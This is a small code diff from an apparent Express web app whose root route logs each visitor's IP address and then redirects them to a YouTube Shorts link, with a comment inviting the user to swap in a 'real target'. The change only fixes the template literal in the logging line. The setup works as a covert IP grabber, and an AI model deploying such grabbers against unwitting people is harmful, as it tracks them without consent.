@@ -10,7 +10,7 @@ app.get('/', (req, res) => {
     // fs.appendFile('ip-log.txt', log, (err) => {
     //     if (err) console.error('Failed to log IP:', err);
     // });
-    console.log('[User Log] Visitor IP: ${ip} at ${new Date().toISOString()}');
+    console.log(`[User Log] Visitor IP: ${ip} at ${new Date().toISOString()}`);
 
     // Redirect after logging
     res.redirect('https://youtube.com/shorts/q3Nj9ZMSw4I?si=UQkW4aiFcjz7BKgi'); // change this to your real target
